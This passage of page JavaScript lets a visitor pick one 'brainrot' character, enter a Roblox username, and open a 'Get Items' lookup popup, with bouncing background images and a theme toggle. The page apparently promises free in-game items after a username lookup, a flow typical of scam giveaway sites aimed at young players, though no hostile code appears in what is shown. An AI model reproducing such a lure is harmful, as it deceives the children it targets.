          itemCard.removeClass('selected');
          selectedItems = selectedItems.filter(item => item.name !== itemName);
        } else {
          // If another item is already selected, deselect it first
          if (selectedItems.length >= 1) {
            $('.item-card.selected').removeClass('selected');
            selectedItems = [];
          }
          
          // Select item
          itemCard.addClass('selected');
          selectedItems.push({ name: itemName, image: itemImage });
        }
        
        // Play sound
        dingSound.currentTime = 0;
        dingSound.play();
        
        // Update continue button visibility
        refreshContinueButton();
      });
      
      // Handle Continue button click
      if (mainContinueBtn) {
        mainContinueBtn.addEventListener('click', function() {
          const username = mainUsernameInput ? mainUsernameInput.value.trim() : '';
          
          if (!username) {
            showTopError('Please enter your Roblox username!');
            if (mainUsernameInput) mainUsernameInput.focus();
            return;
          }
          
          if (selectedItems.length !== 1) {
            showTopError('Please select one brainrot!');
            return;
          }
          
          // Play click sound
          const clickSound = document.getElementById('clickSound');
          if (clickSound) {
            clickSound.currentTime = 0;
            clickSound.play();
          }
          
          // Show profile lookup popup
          const popup = document.getElementById('purchase-popup');
          if (popup) {
            popup.style.display = 'flex';
          }
          
          // Start username confirmation flow
          showUsernameConfirmation(username, selectedItems[0].name, selectedItems[0].image, function() {
            // Retry callback - just refocus username input
            if (mainUsernameInput) mainUsernameInput.focus();
          });
        });
      }
      
      // Initial state
      refreshContinueButton();
    });
    
    // Function to show multi-item purchase popup
    const showMultiItemPurchasePopup = (items) => {
      // Stop notifications
      popupOpen = true;
      stopNotifications();
      
      const popup = document.getElementById('purchase-popup');
      const popupContent = popup.querySelector('.popup-content');
      
      // Create item images HTML
      let itemImagesHTML = '<div style="display: flex; justify-content: center; gap: 10px; margin-bottom: 15px;">';
      items.forEach(item => {
        itemImagesHTML += `<img src="${item.image}" alt="${item.name}" style="width: 70px; height: 70px; object-fit: cover; border-radius: 10px; background: rgba(255,255,255,0.1);">`;
      });
      itemImagesHTML += '</div>';
      
      // Create item names HTML
      let itemNamesHTML = '<p class="item-confirm">Would you like to Get "<span>';
      items.forEach((item, index) => {
        if (index > 0) {
          itemNamesHTML += index === items.length - 1 ? ' and ' : ', ';
        }
        itemNamesHTML += item.name;
      });
      itemNamesHTML += '</span>"?</p>';
      
      popupContent.innerHTML = `
        <div class="popup-header">
          <h3>Get Items</h3>
        </div>
        ${itemImagesHTML}
        ${itemNamesHTML}
        <div class="input-group">
          <input type="text" id="username-input" placeholder="Enter your Roblox username">
        </div>
        <div class="user-error d-none">Please enter a valid username</div>
        <div class="popup-buttons">
          <button class="cancel-btn">Cancel</button>
          <button class="action-btn" id="search-user-btn">
            <span class="action-badge">Search Now ‚û§</span>
          </button>
        </div>
      `;
      
      popupContent.querySelector('.cancel-btn').addEventListener('click', closePurchasePopup);
      popupContent.querySelector('#search-user-btn').addEventListener('click', function() {
        // Play sound when clicking button
        const clickSound = document.getElementById('clickSound');
        clickSound.currentTime = 0;
        clickSound.play();
        
        const username = document.getElementById('username-input').value.trim();
        if (!username) {
          document.querySelector('.user-error').classList.remove('d-none');
          return;
        }
        showUsernameConfirmation(username, items[0].name, items[0].image, function() { showMultiItemPurchasePopup(items); });
      });
      
      popup.style.display = 'flex';
      document.getElementById('username-input').focus();
    }

    // Inject pulsing animation and button styles for the Let's Go button
    (function() {
      const style = document.createElement('style');
      style.innerHTML = `
        @keyframes pulse-glow {
          0% { box-shadow: 0 0 0 0 #22c55e88; }
          70% { box-shadow: 0 0 0 16px #22c55e00; }
          100% { box-shadow: 0 0 0 0 #22c55e00; }
        }
        .lets-go-btn-animated {
          background: linear-gradient(90deg, #22c55e 0%, #16e085 100%);
          color: #fff;
          font-size: 1.35em;
          font-weight: 900;
          border-radius: 16px;
          border: none;
          padding: 22px 0;
          width: 100%;
          cursor: pointer;
          box-shadow: 0 2px 16px #22c55e55;
          animation: pulse-glow 1.3s infinite;
          transition: transform 0.15s, box-shadow 0.2s;
          position: relative;
          letter-spacing: 0.5px;
        }
        .lets-go-btn-animated:active {
          transform: scale(0.97) translateY(2px);
          box-shadow: 0 1px 8px #22c55e99;
        }
        .lets-go-btn-animated:hover {
          transform: scale(1.04) translateY(-2px);
          box-shadow: 0 4px 24px #22c55e99;
        }
        .lets-go-microcopy {
          color: var(--accent3);
          font-size: 1.08em;
          font-weight: 700;
          margin-top: 13px;
          text-shadow: 0 1px 8px #0002;
          letter-spacing: 0.2px;
        }
      `;
      document.head.appendChild(style);
    })();
    
    // Background Pets Management
    (function() {
      const petImages = [
        'images/Strawberryelephant-1-288x300.webp',
        'images/Clear_background_clear_meowl_image-207x300.webp',
        'images/Skibidi-Toilet-194x300.webp'
      ];
      
      const backgroundPetsContainer = document.getElementById('backgroundPets');
      let activePets = [];
      const maxPets = 3;
      
      class BouncingPet {
        constructor(imageSrc, startX, startY, vx, vy) {
          this.element = document.createElement('div');
          this.element.className = 'floating-pet';
          
          const img = document.createElement('img');
          img.src = imageSrc;
          img.alt = 'Floating Brainrot';
          
          this.element.appendChild(img);
          
          // Starting position and velocity
          this.x = startX;
          this.y = startY;
          this.vx = vx;
          this.vy = vy;
          
          // Size
          this.width = 95;
          this.height = 95;
          
          this.updatePosition();
          backgroundPetsContainer.appendChild(this.element);
        }
        
        updatePosition() {
          this.element.style.transform = `translate3d(${this.x}px, ${this.y}px, 0)`;
        }
        
        update() {
          // Update position
          this.x += this.vx;
          this.y += this.vy;
          
          // Check for wall collisions
          if (this.x <= 0 || this.x >= window.innerWidth - this.width) {
            this.vx = -this.vx;
            this.x = Math.max(0, Math.min(this.x, window.innerWidth - this.width));
          }
          
          if (this.y <= 0 || this.y >= window.innerHeight - this.height) {
            this.vy = -this.vy;
            this.y = Math.max(0, Math.min(this.y, window.innerHeight - this.height));
          }
          
          this.updatePosition();
        }
        
        destroy() {
          if (this.element.parentNode) {
            this.element.parentNode.removeChild(this.element);
          }
        }
      }
      
      function createPets() {
        // Clear any existing pets
        activePets.forEach(pet => pet.destroy());
        activePets = [];
        
        // Create 3 specific brainrots with different starting positions and velocities
        const pets = [
          {
            image: 'images/Strawberryelephant-1-288x300.webp',
            startX: 120,
            startY: 180,
            vx: 1.8,
            vy: 1.5
          },
          {
            image: 'images/Clear_background_clear_meowl_image-207x300.webp',
            startX: window.innerWidth - 215,
            startY: 300,
            vx: -1.6,
            vy: 1.9
          },
          {
            image: 'images/Skibidi-Toilet-194x300.webp',
            startX: 300,
            startY: window.innerHeight - 215,
            vx: 1.4,
            vy: -1.7
          }
        ];
        
        pets.forEach(petData => {
          const pet = new BouncingPet(
            petData.image,
            petData.startX,
            petData.startY,
            petData.vx,
            petData.vy
          );
          activePets.push(pet);
        });
      }
      
      let animationId;
      
      function animatePets() {
        activePets.forEach(pet => pet.update());
        animationId = requestAnimationFrame(animatePets);
      }
      
      function stopPetsAnimation() {
        if (animationId) {
          cancelAnimationFrame(animationId);
          animationId = null;
        }
      }
      
      // Make stopPetsAnimation globally accessible
      window.stopPetsAnimation = stopPetsAnimation;
      
      function initializePets() {
        createPets();
        animatePets();
      }
      
      // Start pets when page loads
      window.addEventListener('load', initializePets);
      
      // Adjust pets on window resize
      window.addEventListener('resize', () => {
        // Recreate pets with new window dimensions
        createPets();
      });
      
      // Cleanup on page unload
      window.addEventListener('beforeunload', () => {
        if (animationId) {
          cancelAnimationFrame(animationId);
        }
      });
    })();

    // Theme Toggle
    (function() {
      const themeToggle = document.getElementById('themeToggle');
      const body = document.body;
      const currentTheme = localStorage.getItem('theme');

      // Default to night mode if no preference is saved
      if (currentTheme === 'night' || currentTheme === null) {
        body.classList.add('night-mode');
        themeToggle.classList.add('night-mode');
      }

      themeToggle.addEventListener('click', () => {
        body.classList.toggle('night-mode');
        themeToggle.classList.toggle('night-mode');
        
        if (body.classList.contains('night-mode')) {
          localStorage.setItem('theme', 'night');
        } else {
          localStorage.setItem('theme', 'light');
        }
      });
    })();
  </script>
